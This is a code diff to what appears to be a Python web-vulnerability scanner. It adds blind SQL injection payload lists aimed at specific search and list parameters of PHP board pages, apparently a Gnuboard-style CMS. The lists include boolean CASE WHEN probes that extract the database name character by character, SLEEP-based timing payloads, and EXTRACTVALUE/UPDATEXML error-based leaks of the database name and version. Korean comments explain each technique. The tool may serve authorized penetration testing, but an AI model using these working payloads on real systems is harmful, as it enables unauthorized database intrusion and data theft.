@@ -181,6 +181,21 @@ XSS_CONTEXT_PAYLOADS = {
 
 BLIND_SQLI_PAYLOADS: dict = {
 
+    # ══ qalist.php sfl — 컬럼명 자리 CASE WHEN Boolean Blind ═══════
+    # search.php sfl과 동일 구조
+    "sqli_qalist_sfl": [
+        {"type": "BOOLEAN", "family": "case_true",
+         "payload": "(CASE WHEN (1=1) THEN wr_subject ELSE wr_content END)"},
+        {"type": "BOOLEAN", "family": "case_false",
+         "payload": "(CASE WHEN (1=2) THEN wr_subject ELSE wr_content END)"},
+        {"type": "BOOLEAN", "family": "case_db_len",
+         "payload": "(CASE WHEN (LENGTH(database())>0) THEN wr_subject ELSE wr_content END)"},
+        {"type": "BOOLEAN", "family": "case_db_char",
+         "payload": "(CASE WHEN (SUBSTR(database(),1,1)>'a') THEN wr_subject ELSE wr_content END)"},
+        {"type": "TIME_BASED", "family": "case_sleep",
+         "payload": "(CASE WHEN (SLEEP(5)=0) THEN wr_subject ELSE wr_content END)"},
+    ],
+
     # ══ ZAP 탐지: qalist.php stx (싱글쿼트 컨텍스트) ════════════
     # ctrl_true:  "test' AND '1'='1' -- "
     # ctrl_false: "test' AND '1'='2' -- "
@@ -255,6 +270,58 @@ BLIND_SQLI_PAYLOADS: dict = {
          "payload": 'and" AND 0 IN (SELECT SLEEP(5)) -- '},
         {"type": "TIME_BASED", "family": "zap_if_sleep",
          "payload": 'and" AND IF(1=1,SLEEP(5),0) -- '},
+    ],
+
+    # ══ search.php sfl — 컬럼명 자리 CASE WHEN Boolean Blind ═══════
+    # SQL 구조: WHERE {sfl} LIKE '%{stx}%'
+    # sfl은 컬럼명 위치 → 일반 ' OR 1=1 안 됨
+    # CASE WHEN 기법: 조건 TRUE이면 wr_subject(ctrl_true≈20853),
+    #                 FALSE이면 wr_content(ctrl_false≈18616)
+    # → 응답 길이 차이로 Boolean 탐지
+    "sqli_search_sfl": [
+        # Boolean — 기본 TRUE/FALSE 확인
+        {"type": "BOOLEAN", "family": "case_true",
+         "payload": "(CASE WHEN (1=1) THEN wr_subject ELSE wr_content END)"},
+        {"type": "BOOLEAN", "family": "case_false",
+         "payload": "(CASE WHEN (1=2) THEN wr_subject ELSE wr_content END)"},
+        # Boolean — DB 서브쿼리 접근 가능 여부
+        {"type": "BOOLEAN", "family": "case_db_exists",
+         "payload": "(CASE WHEN ((SELECT 1 FROM information_schema.tables LIMIT 1)=1) THEN wr_subject ELSE wr_content END)"},
+        {"type": "BOOLEAN", "family": "case_db_len",
+         "payload": "(CASE WHEN (LENGTH(database())>0) THEN wr_subject ELSE wr_content END)"},
+        {"type": "BOOLEAN", "family": "case_db_char",
+         "payload": "(CASE WHEN (SUBSTR(database(),1,1)>'a') THEN wr_subject ELSE wr_content END)"},
+        # Time-based — SLEEP을 CASE WHEN 조건에 삽입
+        # SLEEP(5) 실행 후 0 반환 → 0=0 TRUE → wr_subject LIKE '%stx%' 수행
+        {"type": "TIME_BASED", "family": "case_sleep",
+         "payload": "(CASE WHEN (SLEEP(5)=0) THEN wr_subject ELSE wr_content END)"},
+        {"type": "TIME_BASED", "family": "case_if_sleep",
+         "payload": "(CASE WHEN (IF(1=1,SLEEP(5),0)=0) THEN wr_subject ELSE wr_content END)"},
+    ],
+
+    # ══ search.php sst — ORDER BY 자리 에러/타임 기반 탐지 ══════════
+    # SQL 구조: ORDER BY {sst} {sod}
+    # ORDER BY는 boolean 길이 차이 없음 → Error / Time 탐지만 현실적
+    # CASE WHEN으로 ORDER BY 컬럼 전환 → 정렬순 바뀌지만 길이는 동일
+    # → 에러 기반 또는 시간 지연 탐지 사용
+    "sqli_search_sst": [
+        # Error-based
+        {"type": "SQLI_ORDERBY", "family": "extractvalue",
+         "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
+        {"type": "SQLI_ORDERBY", "family": "updatexml",
+         "payload": "UPDATEXML(1,CONCAT(0x7e,version()),1)"},
+        # Time-based — ORDER BY IF/CASE/SELECT SLEEP
+        {"type": "TIME_BASED", "family": "sleep_subq",
+         "payload": "(SELECT SLEEP(5))"},
+        {"type": "TIME_BASED", "family": "if_sleep",
+         "payload": "IF(1=1,SLEEP(5),0)"},
+        {"type": "TIME_BASED", "family": "case_sleep",
+         "payload": "CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END"},
+        # CASE WHEN 정렬 전환 (Boolean 탐지 힌트용 — 길이 차이는 미미)
+        {"type": "BOOLEAN", "family": "case_orderby_true",
+         "payload": "CASE WHEN (1=1) THEN wr_datetime ELSE wr_num END"},
+        {"type": "BOOLEAN", "family": "case_orderby_false",
+         "payload": "CASE WHEN (1=2) THEN wr_datetime ELSE wr_num END"},
     ],
 
     # ══ search.php stx — 괄호 닫기 방식 Boolean + Time ═══════════
@@ -1155,8 +1222,14 @@ def main():
         with open(args.payloads, encoding="utf-8") as f:
             all_payloads: Dict = json.load(f)
     except FileNotFoundError:
-        print(f"[ERROR] {args.payloads} 없음. generate_payloads.py 먼저 실행.")
-        sys.exit(1)
+        # --point 지정 + BLIND_SQLI_PAYLOADS에 있으면 파일 없어도 진행
+        if args.point and args.point in BLIND_SQLI_PAYLOADS:
+            print(f"  [INFO] {args.payloads} 없음 → "
+                  f"{args.point} 는 BLIND_SQLI_PAYLOADS로 자동 진행")
+            all_payloads = {}
+        else:
+            print(f"[ERROR] {args.payloads} 없음. generate_payloads.py 먼저 실행.")
+            sys.exit(1)
 
     # targets.json 자동 로드 (crawler.py → analyzer.py 연동)
     if args.targets:
